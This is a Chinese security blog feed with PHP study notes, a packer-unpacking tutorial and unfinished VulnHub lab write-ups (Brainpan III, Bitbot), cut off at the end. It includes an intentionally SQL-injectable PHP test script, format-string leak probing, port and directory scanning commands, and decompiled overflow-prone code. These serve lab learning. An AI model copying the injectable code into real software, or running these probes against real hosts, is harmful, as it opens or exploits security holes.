PHP输出"></a>0x02 PHP输出</h2><p><strong>echo、print、print_r、var_dump()、var_export()</strong></p><pre><code>echo 输出一个或多个字符串，和 print 最主要的不同之处是， echo 接受参数列表，并且没有返回值。print 输出字符串，和 echo 最主要的区别： print 仅支持一个参数，并总是返回 1print_r()  以易于理解的格式打印变量。var_dump() 打印变量的相关信息，此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。var_export() 输出或返回一个变量的字符串表示，此函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的表示是合法的 PHP 代码。</code></pre><h2 id="0x03-目录相关"><a href="#0x03-目录相关" class="headerlink" title="0x03 目录相关"></a>0x03 目录相关</h2><p><strong>chdir(newdir) ——改变目录</strong></p><pre><code>&lt;?phpecho getcwd().&quot;\n&quot;;chdir(&#39;/test&#39;);echo getcwd().&quot;\n&quot;;?&gt;</code></pre><p><strong>chroot() ——改变根目录</strong></p><p><strong>dir() ——返回一个 Directory 类实例</strong></p><pre><code>&lt;?php$d=dir(&#39;./&#39;);echo &quot;path: &quot;.$d-&gt;path.&quot;\n&quot;;while(false!==($entry=$d-&gt;read())){    echo $entry.&quot;\n&quot;;}$d-&gt;close();</code></pre><p><strong>getcwd() ——获取当前目录的路径</strong></p><pre><code>&lt;?phpecho getcwd();</code></pre><p><strong>opendir() ——打开目录</strong><br><strong>readdir() ——从目录句柄中读取条目</strong></p><pre><code>&lt;?phpif($d=opendir(&#39;./&#39;)){    echo &quot;directory: $d \n&quot;;    echo &quot;files: \n&quot;;    while(false!==($file=readdir($d))){        echo &quot;$file\n&quot;;    }}</code></pre><p><strong>scandir() ——列出指定路径中的文件和目录</strong></p><pre><code>var_dump(scandir(&#39;./&#39;)); #列出指定目录的文件或文件夹</code></pre><h2 id="0x10-PHP函数"><a href="#0x10-PHP函数" class="headerlink" title="0x10 PHP函数"></a>0x10 PHP函数</h2><p><strong>basename() ——返回路径中的文件名部分</strong><br><img src="/PHP%E5%AD%A6%E4%B9%A0/1.png" alt></p><p><strong>copy() ——拷贝文件</strong></p><pre><code>&lt;?phpcopy(&#39;./1.txt&#39;,&#39;./2.txt&#39;); #源文件1.txt，目标文件2.txt&lt;?phpcopy(&#39;f:\\test\\1.txt&#39;,&#39;d:\\1.php&#39;);</code></pre><p><strong>dirname() ——返回路径中的目录部分</strong></p><pre><code>&lt;?phpecho dirname(&#39;f:\\test\\1.txt&#39;); #f:\testecho dirname(&#39;/var/www/html/1.txt&#39;); #/var/www/html</code></pre><p><strong>disk_free_space() ——返回目录中的可用空间</strong></p><pre><code>&lt;?phpecho disk_free_space(&#39;f:&#39;); #F盘echo disk_free_space(&#39;/&#39;); #</code></pre><p><strong>disk_total_space() ——返回一个目录的磁盘总大小</strong></p><pre><code>&lt;?phpecho disk_total_space(&#39;f:&#39;); #F盘</code></pre><p><strong>fclose() ——关闭一个已打开的文件指针</strong></p><pre><code>fclose(); #fopen();或fsockopen()</code></pre><p><strong>file_exists() ——检查文件或目录是否存在</strong></p><pre><code>&lt;?php  echo file_exists(&#39;/var/&#39;); #1echo file_exists(&#39;/var/www/html/test1.php&#39;); #1echo file_exists(&#39;/var/www/html/test11.php&#39;); #存在即输出1，不存在不输出</code></pre><p><strong>file_get_contents() ——读整个文件</strong></p><pre><code>&lt;?phpecho file_get_contents(&#39;./1.txt&#39;); </code></pre><p><strong>file_put_contents() ——将字符串写入文件</strong></p><pre><code>&lt;?php$file=&#39;./1.txt&#39;;  #file_get_contents$file_contents=file_get_contents($file);$file_contents .=&#39;     file_put_contents&#39;;file_put_contents($file,$file_contents); #1.txt： file_get_contents     file_put_contents</code></pre><p><strong>file() ——把整个文件读入到一个数组中</strong></p><pre><code>&lt;?php$lines=file(&#39;1.txt&#39;);foreach($lines as $line){    echo($line);}</code></pre><p><strong>filesize() ——获取文件大小</strong></p><pre><code>&lt;?phpecho filesize(&#39;./1.txt&#39;);</code></pre><p><strong>filetype() ——获取文件类型</strong></p><pre><code>&lt;?phpecho filetype(&#39;./1.txt&#39;);</code></pre><p><strong>fopen() ——打开文件或URL</strong></p><pre><code>&lt;?php$file = fopen (&quot;1.txt&quot;,&quot;r&quot;);if ($file) {    while (!feof($file)) {        $buffer = fgets($file, 4096);        echo $buffer;    }    fclose($file);}&lt;?php$file = fopen (&quot;http://192.168.100.1/1.txt&quot;,&quot;r&quot;);if ($file) {    while (!feof($file)) {        $buffer = fgets($file, 4096);        echo $buffer;    }    fclose($file);}</code></pre><p><strong>fread() ——读取文件</strong></p><pre><code>&lt;?php$file=fopen(&#39;./1.txt&#39;,&#39;r&#39;);echo fread($file,&quot;10&quot;);  #读取10个字节fclose($file);</code></pre><p><strong>is_dir() ——判断给定文件名是否一个目录</strong></p><pre><code>&lt;?phpecho is_dir(&#39;f:\\test\\&#39;);</code></pre><p><strong>is_executable() ——判断给定文件名是否可执行</strong></p><pre><code>is_executable($file)</code></pre><p><strong>is_file() ——判断给定文件名是否为一个正常的文件</strong><br><strong>is_link() ——判断给定文件名是否为一个符号连接</strong><br><strong>is_readable() ——判断给定文件名是否可读</strong></p><p><strong>is_uploaded_file() ——判断文件是否是通过 HTTP POST 上传的</strong></p><pre><code>&lt;?phpif (is_uploaded_file($_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;])) {   echo &quot;File &quot;. $_FILES[&#39;userfile&#39;][&#39;name&#39;] .&quot; uploaded successfully.\n&quot;;   echo &quot;Displaying contents\n&quot;;   readfile($_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;]);} else {   echo &quot;Possible file upload attack: &quot;;   echo &quot;filename &#39;&quot;. $_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;] . &quot;&#39;.&quot;;}?&gt;</code></pre><p><strong>mkdir() ——新建目录</strong></p><pre><code>&lt;?phpmkdir(&#39;./test/&#39;);  #脚本所在目录</code></pre><p><strong>move_uploaded_file() ——将上传的文件移动到新位置</strong></p><pre><code>&lt;?php$uploads_dir = &#39;/uploads&#39;;foreach ($_FILES[&quot;pictures&quot;][&quot;error&quot;] as $key =&gt; $error) {    if ($error == UPLOAD_ERR_OK) {        $tmp_name = $_FILES[&quot;pictures&quot;][&quot;tmp_name&quot;][$key];        $name = $_FILES[&quot;pictures&quot;][&quot;name&quot;][$key];        move_uploaded_file($tmp_name, &quot;$uploads_dir/$name&quot;);    }}?&gt;</code></pre><p><strong>pathinfo() ——返回文件路径的信息</strong></p><pre><code>&lt;?php$path_parts = pathinfo(&#39;f:\\test\\1.txt&#39;); echo $path_parts[&#39;dirname&#39;], &quot;\n&quot;; #f:\testecho $path_parts[&#39;basename&#39;], &quot;\n&quot;; #1.txtecho $path_parts[&#39;extension&#39;], &quot;\n&quot;; #txtecho $path_parts[&#39;filename&#39;], &quot;\n&quot;;  #1?&gt;</code></pre><p><strong>readfile() ——输出文件</strong></p><pre><code>&lt;?php$file = &#39;./test1.php&#39;;if (file_exists($file)) {    header(&#39;Content-Description: File Transfer&#39;);    header(&#39;Content-Type: application/octet-stream&#39;);    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.basename($file).&#39;&quot;&#39;);    header(&#39;Expires: 0&#39;);    header(&#39;Cache-Control: must-revalidate&#39;);    header(&#39;Pragma: public&#39;);    header(&#39;Content-Length: &#39; . filesize($file));    readfile($file);    exit;}?&gt;</code></pre><p><strong>rename(oldname,newname) ——重命名一个文件或目录</strong></p><pre><code>&lt;?phprename(&#39;./1.txt&#39;,&#39;./2.txt&#39;);</code></pre><p><strong>rmdir() ——删除目录</strong></p><pre><code>&lt;?phpif (!is_dir(&#39;examples&#39;)) {    mkdir(&#39;examples&#39;);}rmdir(&#39;examples&#39;);?&gt;</code></pre><p><strong>unlink() ——删除文件</strong><br>unlink(‘./1.txt’);  #删除当前文件夹的1.txt<br>unlink(‘f:\test\1.txt’);  #删除指定路径下的文件1.txt</p><h2 id="0x20-PHP与mysql"><a href="#0x20-PHP与mysql" class="headerlink" title="0x20 PHP与mysql"></a>0x20 PHP与mysql</h2><ol><li>mysql</li><li>mysqli（improved，改善的）(PHP V5以上)：只针对mysql</li><li>PDO（PHP DATA Objects）：适用12种数据库</li></ol><p><strong>mysqli</strong>（安装忽略）</p><ol><li><img src="/PHP%E5%AD%A6%E4%B9%A0/2.png" alt></li></ol><p><strong>PDO</strong>（安装忽略）</p><ol><li><img src="/PHP%E5%AD%A6%E4%B9%A0/3.png" alt></li></ol><h2 id="0x21-连接mysql"><a href="#0x21-连接mysql" class="headerlink" title="0x21 连接mysql"></a>0x21 连接mysql</h2><p><strong>mysql_connect()</strong></p><pre><code>&lt;?php #error_reporting(E_ALL^E_DEPRECATED);$connect=mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root1&quot;);if(!$connect){    die(&quot;Connect failed~&quot;.mysql_error());}else{    die(&quot;succee&quot;);}#$connect-&gt;close(); #关闭连接mysql_close($connect); #关闭连接?&gt;</code></pre><ol><li><img src="/PHP%E5%AD%A6%E4%B9%A0/4.png" alt></li><li>提示：不推荐使用mysql_connect()</li><li>去掉提示可以选择：</li><li>一、修改php.ini里，display_errors = On 改为 display_errors = Off，修改后重启phpstudy</li><li>二、php代码里添加 error_reporting(E_ALL^E_DEPRECATED);（前面代码去掉注释符#）<br>账号或密码错误<pre><code>Connect failed~Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES)</code></pre></li></ol><p><strong>mysqli_connect()</strong></p><pre><code>&lt;?php #error_reporting(E_ALL^E_WARNING);$connect=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);if(!$connect){    die(&quot;Connect failed~ &quot;.mysqli_connect_error());}else{    die(&quot;succee&quot;);}mysqli_close($connect); #关闭连接?&gt;</code></pre><p>账号或密码错误</p><pre><code>Connect failed~ Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES)</code></pre><p><strong>PDO()</strong></p><pre><code>&lt;?php $host=&quot;127.0.0.1&quot;;$user=&quot;root&quot;;$pass=&quot;root1&quot;;$dbhost=&quot;mysql:host=$host&quot;;#$dbname=&quot;security&quot;;#$dbhost_dbname=&quot;mysql:host=$host;dbname=$dbname&quot;;try{    $connect=new PDO($dbhost,$user,$pass);    die(&quot;succee&quot;);    $connect=null; #关闭连接}catch(PDOException $e){    die($e-&gt;getMessage());}?&gt;</code></pre><p>账号或密码错误</p><pre><code>SQLSTATE[HY000] [1045] Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES)</code></pre><p>绕过WAF注入测试脚本（数据库为sqli-labs的数据库security）</p><pre><code>&lt;?php error_reporting(E_ALL^E_DEPRECATED);$connect=mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);if(!$connect){    die(&quot;Could not connect: &quot;.mysql_error());}mysql_select_db(&quot;security&quot;,$connect);$id=$_REQUEST[&#39;id&#39;];$query=&quot;select * from users where id=$id&quot;;$result=mysql_query($query);while($row=mysql_fetch_array($result)){    echo $row[&#39;0&#39;].&quot; &quot;.$row[&#39;1&#39;].&quot; &quot;.$row[&#39;2&#39;];    echo &quot;&lt;br /&gt;&quot;;}echo &quot;&lt;br /&gt;&quot;;echo $query;mysql_close($connect);?&gt;</code></pre><h2 id="0x30-PHP支持的协议和封装协议"><a href="#0x30-PHP支持的协议和封装协议" class="headerlink" title="0x30 PHP支持的协议和封装协议"></a>0x30 PHP支持的协议和封装协议</h2><p><strong>file:// ——访问本地文件</strong></p><pre><code>&lt;?phpprint_r(file_get_contents(&#39;file://f:\\test\\1.txt&#39;,&#39;r&#39;));</code></pre><p><strong>http(s):// ——访问http(s)网址</strong></p><pre><code>&lt;?php$http_fopen=fopen(&#39;http://127.0.0.1/phpinfo.php&#39;,&#39;r&#39;);$meta_data=stream_get_meta_data($http_fopen);print_r($meta_data);print_r($meta_data[&#39;wrapper_data&#39;]);</code></pre><p><strong>ftp(s):// ——访问FTP(s)URLs</strong></p><pre><code>ftp://example.com/pub/file.txtftp://user:password@example.com/pub/file.txtftps://example.com/pub/file.txtftps://user:password@example.com/pub/file.txt</code></pre><p><strong>php:// ——访问各个输入、输出流</strong></p><pre><code>允许访问 PHP 的输入输出流、标准输入输出和错误描述符php://stdin、php://stdout、php://stderrphp://stdin 是只读的， php://stdout 和 php://stderr 是只写的。php://input 是个可以访问请求的原始数据的只读流。php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。php://fd 允许直接访问指定的文件描述符。php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。php.ini默认配置allow_url_fopen = Onallow_url_include = Off</code></pre><pre><code>&lt;?php while($line=fopen(&#39;php://stdin&#39;,&#39;r&#39;)){    echo fgets($line);}</code></pre><p><img src="/PHP%E5%AD%A6%E4%B9%A0/5.png" alt></p><pre><code>&lt;?php readfile(&quot;php://filter/resource=http://127.0.0.1&quot;);  //php://filter/resource=&lt;待过滤的数据流&gt;readfile(&quot;php://filter/read=string.toupper/resource=http://127.0.0.1&quot;);  //php://filter/read=&lt;读链需要应用的过滤器列表&gt;，以大写字母输出readfile(&quot;php://filter/read=string.toupper|string.rot13/resource=http://127.0.0.1&quot;);  //php://filter/read=&lt;读链需要应用的过滤器列表&gt;，以大写字母输出且用 ROT13 加密file_put_contents(&quot;php://filter/write=string.rot13/resource=example.txt&quot;,&quot;Hello World&quot;);  //php://filter/write=&lt;写链需要应用的过滤器列表&gt;，写入到文件且用 ROT13 加密</code></pre><p><img src="/PHP%E5%AD%A6%E4%B9%A0/6.png" alt><br><img src="/PHP%E5%AD%A6%E4%B9%A0/7.png" alt></p><p><strong>zlib:// bzip:// zip:// ——压缩流</strong></p><pre><code>#压缩文件1.zip(文件1.txt(内容123456))&lt;?php $fp=fopen(&#39;zip://./1.zip#1.txt&#39;,&#39;r&#39;);if($fp){    while(!feof($fp)){        echo fread($fp, 1024);    }    fclose($fp);}其他选项compress.zlib://file.gzcompress.bzip2://file.bz2zip://archive.zip#dir/file.txt</code></pre><p><strong>data:// ——数据（RFC 2397）</strong></p><pre><code>data://text/plain;base64&lt;?php echo file_get_contents(&#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39;); #I love PHP</code></pre><p><strong>glob:// ——查找匹配的文件路径模式</strong></p><pre><code>&lt;?php $all_file=new DirectoryIterator(&quot;glob://f:\\test\\*.*&quot;);foreach ($all_file as $f) {    printf(&quot;%s: %.1FK\n&quot;,$f-&gt;getFilename(),$f-&gt;getsize()/1024);}</code></pre><p><img src="/PHP%E5%AD%A6%E4%B9%A0/8.png" alt></p><p><strong>phar:// ——PHP 归档</strong><br><a href="https://xz.aliyun.com/t/2715" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715</a></p><p><strong>ssh2:// ——Secure Shell 2</strong></p><pre><code>ssh2.shell://user:pass@example.com:22/xtermssh2.exec://user:pass@example.com:22/usr/local/bin/somecmdssh2.tunnel://user:pass@example.com:22/192.168.0.1:14ssh2.sftp://user:pass@example.com:22/path/to/filename</code></pre><p><strong>rar:// ——RAR</strong></p><pre><code>rar://&lt;url encoded archive name&gt;[*][#[&lt;url encoded entry name&gt;]]</code></pre><p><strong>ogg:// ——音频流</strong></p><pre><code>ogg://soundfile.oggogg:///path/to/soundfile.oggogg://http://www.example.com/path/to/soundstream.ogg</code></pre><p><strong>expect:// ——处理交互式的流</strong></p><pre><code>expect://command</code></pre><h2 id="0x40-PHP运算符"><a href="#0x40-PHP运算符" class="headerlink" title="0x40 PHP运算符"></a>0x40 PHP运算符</h2><h3 id="0x41-比较运算符"><a href="#0x41-比较运算符" class="headerlink" title="0x41 比较运算符"></a>0x41 比较运算符</h3><ol><li><a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">PHP比较运算符</a></li><li><a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP类型比较表</a></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.php.net/manual/zh/index.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/index.php</a></li><li><a href="https://www.runoob.com/php/php-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>脱壳二</title>
      <link href="/%E8%84%B1%E5%A3%B3%E4%BA%8C/"/>
      <url>/%E8%84%B1%E5%A3%B3%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol><li>工具：PEID（查壳）、OllyDbg（调试）、OllyDbg自带的插件（脱壳）、LordPE（脱壳）、ImportREC（修复）</li><li>加壳的程序</li></ol><h2 id="0x10-Nspack壳"><a href="#0x10-Nspack壳" class="headerlink" title="0x10 Nspack壳"></a>0x10 Nspack壳</h2><ol><li>查壳</li><li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/1.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/3.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/2.png" alt></li><li>OD载入，先看看pushfd，pushad</li><li>pushad: 将所有的32位通用寄存器压入堆栈</li><li>pusha:将所有的16位通用寄存器压入堆栈</li><li>pushfd:然后将32位标志寄存器EFLAGS压入堆栈</li><li>pushf::将的16位标志寄存器EFLAGS压入堆栈</li><li>popad:将所有的32位通用寄存器取出堆栈</li><li>popa:将所有的16位通用寄存器取出堆栈</li><li>popfd:将32位标志寄存器EFLAGS取出堆栈</li><li>popf:将16位标志寄存器EFLAGS取出堆栈</li><li>F8，ESP突变</li><li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/4.png" alt></li><li>右击ESP数值——数值窗口中跟随——数据窗口中右击目的地址——断点——硬件访问——word，运行</li><li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/5.png" alt></li><li>F8，到了一个不明觉厉的画面</li><li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/6.png" alt></li><li>右击反汇编窗口——分析——从模块中删除分析</li><li><img src="/%E8%84%B1%E5%A3%B3%E4%BA%8C/7.png" alt></li><li>到OEP</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li>ximo早期发的脱壳基础</li><li><a href="https://www.52pojie.cn/" target="_blank" rel="noopener">https://www.52pojie.cn/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之Brainpan_III</title>
      <link href="/vulnhub%E4%B9%8BBrainpan-III/"/>
      <url>/vulnhub%E4%B9%8BBrainpan-III/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol><li>kali：192.168.100.4</li><li>netdiscover -i eth0 -r 192.168.100.0/24</li><li>靶机：192.168.100.32——一个二进制文件</li></ol><h2 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h2><ol><li>nmap扫端口：nmap -sT -p- 192.168.100.32</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/1.png" alt></li><li>nc连一下1337端口：nc -v 192.168.100.32 1337</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/2.png" alt></li><li>翻译一下（嘘）</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/3.png" alt></li><li>爆破是不可能的，只能模糊测试</li><li>先（搜）思（大）考（佬）一（博）下（客），一般变量中代表数字或字符的：</li><li>%d：整数</li><li>%o：八进制</li><li>%x：十六进制</li><li>%u：无符号十进制</li><li>%c：字符</li><li>%s：字符串</li><li>%f：实数</li><li>%e：指数</li><li>%p：指针</li><li>……</li><li>输入%d.%d.%d.%d（回车），得到一串不明数字，刚好 数字.数字.数字.数字，四位数7027</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/4.png" alt></li><li>输入7027，O（大）J（佬）B（真）K（棒）</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/5.png" alt></li><li>有个shell选项，发现基本啥都执行不了，废shell</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/6.png" alt></li></ol><h2 id="0x02-分支一"><a href="#0x02-分支一" class="headerlink" title="0x02 分支一"></a>0x02 分支一</h2><ol><li>退出shell，选显示代码存储库，刚才有个8080端口，现在已经open</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/7.png" alt></li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/8.png" alt></li><li>访问<a href="http://192.168.100.32:8080/" target="_blank" rel="noopener">http://192.168.100.32:8080/</a></li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/9.png" alt></li><li>dirsearch扫目录</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/10.png" alt></li><li>访问robots.txt</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/11.png" alt></li><li>得一张动态图</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/12.png" alt></li><li>dirb扫目录,</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/13.png" alt></li><li>访问目录/repo/</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/14.png" alt></li><li>把文件都下载下来，查看文件内容</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/15.png" alt></li><li>IDA打开report，CTRL+F12：函数调用关系图</li></ol><p><strong>main</strong></p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  int result; // eax  int v4; // ST14_4  char dest; // [esp+18h] [ebp-68h]  unsigned int v6; // [esp+7Ch] [ebp-4h]  v6 = __readgsdword(0x14u);  if ( argc &gt; 2 )  {    cb();    strcpy(&amp;dest, argv[1]);    v4 = atoi(argv[2]);    P = (int)REPORT;    N = (void *)(-sysconf(30) &amp; (unsigned int)REPORT);    mprotect(N, 0x1F4u, 7);    if ( v4 )    {      sanitize(&amp;dest);      encrypt(&amp;dest);      record_data(&amp;dest);    }    else    {      record_data(&amp;dest);      record_id(&amp;dest);    }    printf(&quot;[+] RECORDED [%s]\n&quot;, &amp;dest);    result = 0;  }  else  {    printf(&quot;%s &lt;report&gt; [0|1]\n&quot;, *argv);    result = 0;  }  return result;}</code></pre><p><strong>sanitize</strong></p><pre><code>int __cdecl sanitize(char *s){  size_t i; // [esp+18h] [ebp-10h]  int v3; // [esp+1Ch] [ebp-Ch]  v3 = 0;  for ( i = 0; i &lt; strlen(s); ++i )  {    if ( !isalpha(s[i]) )    {      s[i] = 63;      ++v3;    }  }  return v3;}</code></pre><p><strong>encrypt</strong></p><pre><code>size_t __cdecl encrypt(char *s){  unsigned int v1; // eax  size_t result; // eax  unsigned int i; // [esp+18h] [ebp-10h]  int v4; // [esp+1Ch] [ebp-Ch]  v1 = time(0);  srand(v1);  v4 = rand() % 9000 + 1000;  for ( i = 0; ; ++i )  {    result = strlen(s);    if ( i &gt;= result )      break;    s[i] ^= v4;  }  return result;}</code></pre><p><strong>record_data</strong></p><pre><code>int __cdecl record_data(const char *a1){  char *v1; // eax  time_t timer; // [esp+2Ch] [ebp-5Ch]  FILE *stream; // [esp+30h] [ebp-58h]  struct tm *tp; // [esp+34h] [ebp-54h]  char s; // [esp+3Ah] [ebp-4Eh]  char dest[4]; // [esp+54h] [ebp-34h]  int v8; // [esp+58h] [ebp-30h]  int v9; // [esp+5Ch] [ebp-2Ch]  int v10; // [esp+60h] [ebp-28h]  int v11; // [esp+64h] [ebp-24h]  __int16 v12; // [esp+68h] [ebp-20h]  unsigned int v13; // [esp+7Ch] [ebp-Ch]  v13 = __readgsdword(0x14u);  stream = 0;  time(&amp;timer);  tp = localtime(&amp;timer);  strftime(&amp;s, 0x1Au, &quot;%Y%m%d%H%M%S&quot;, tp);  memset(dest, 0, 0x28u);  *(_DWORD *)dest = 1836017711;  v8 = 1851862885;  v9 = 1769172577;  v10 = 1346720303;  v11 = 1398035023;  v12 = 47;  strcat(dest, &amp;s);  v1 = &amp;dest[strlen(dest)];  *(_DWORD *)v1 = 1885696558;  v1[4] = 0;  printf(&quot;[+] WRITING REPORT TO %s\n&quot;, dest);  stream = fopen(dest, &quot;w&quot;);  fputs(a1, stream);  fclose(stream);  strncpy(REPORT, a1, 0x64u);  return feedback();}</code></pre><p><strong>record_id</strong></p><pre><code>int __cdecl record_id(char *src){  char dest; // [esp+19h] [ebp-Fh]  void (*v3)(void); // [esp+1Ch] [ebp-Ch]  v3 = (void (*)(void))feedback;  strcpy(&amp;dest, src);  v3();  return atoi(&amp;dest);}</code></pre><p><strong>feedback</strong></p><pre><code>int feedback(){  puts(&quot;[+] DATA SUCCESSFULLY ENCRYPTED&quot;);  return puts(&quot;[+] DATA SUCCESSFULLY RECORDED&quot;);}</code></pre><h2 id="0x03-分支二"><a href="#0x03-分支二" class="headerlink" title="0x03 分支二"></a>0x03 分支二</h2><ol><li>选命令3</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/16.png" alt></li><li>输入N个%x.</li><li>得到一串：SESSION: bf9d8bbc.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.bf9d8d0a.0.b76ef000.b76efac0.b76f0898.b7543940.b75b50b5.b76efac0.59.4e.59.b76ef8a0.b76ef000.b76efac0.3.e5.</li><li>16进制解码</li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/17.png" alt></li><li><img src="/vulnhub%E4%B9%8BBrainpan-III/18.png" alt></li><li>关键字符Y、N、Y</li><li>未完</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://github.com/ctfhacker/ctf-writeups/tree/master/vulnhub/brainpan3" target="_blank" rel="noopener">https://github.com/ctfhacker/ctf-writeups/tree/master/vulnhub/brainpan3</a></li><li><a href="https://r3v3rs3r.wordpress.com/2015/09/13/brainpan-3-the-write-up/" target="_blank" rel="noopener">https://r3v3rs3r.wordpress.com/2015/09/13/brainpan-3-the-write-up/</a></li><li><a href="https://blog.techorganic.com/2015/10/13/brainpan-3-solution/" target="_blank" rel="noopener">https://blog.techorganic.com/2015/10/13/brainpan-3-solution/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之Bitbot.VulnVM-disk1</title>
      <link href="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/"/>
      <url>/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol><li>kali：192.168.100.4</li><li>靶机：DHCP</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/1.png" alt></li></ol><h2 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h2><ol><li>netdiscover -i eth0 -r 192.168.100.0/24 #-i 网卡； -r 范围</li><li>找到靶机ip为192.168.100.31</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/2.png" alt></li><li>端口扫描：nmap -A 192.168.100.31</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/3.png" alt></li><li>存活22,80,111端口</li><li>访问80端口</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/4.png" alt></li><li>点击访问，回显403</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/5.png" alt></li><li>扫描目录：python3 dirsearch.py -e * -u <a href="http://192.168.100.31/" target="_blank" rel="noopener">http://192.168.100.31/</a></li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/6.png" alt></li><li>访问admin.php，是个后台</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/7.png" alt></li><li>抓包，丢到sqlmap跑</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/8.png" alt></li><li>sqlmap -r 1.txt，没跑到注入</li></ol><h2 id="0x02-继续"><a href="#0x02-继续" class="headerlink" title="0x02 继续"></a>0x02 继续</h2><ol><li>dirb扫目录：dirb <a href="http://192.168.100.31/" target="_blank" rel="noopener">http://192.168.100.31/</a> /usr/share/dirb/wordlists/big.txt</li><li>也是没啥</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/9.png" alt></li><li>dirbuster扫目录</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/10.png" alt></li><li>依次访问各文件</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/11.png" alt></li><li>根（看）据（大）靶（佬）场（博）提（客）示</li><li><img src="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/12.png" alt></li><li>搜关键字：bitbot botnet</li><li><a href="https://www.exploit-db.com/exploits/27750" target="_blank" 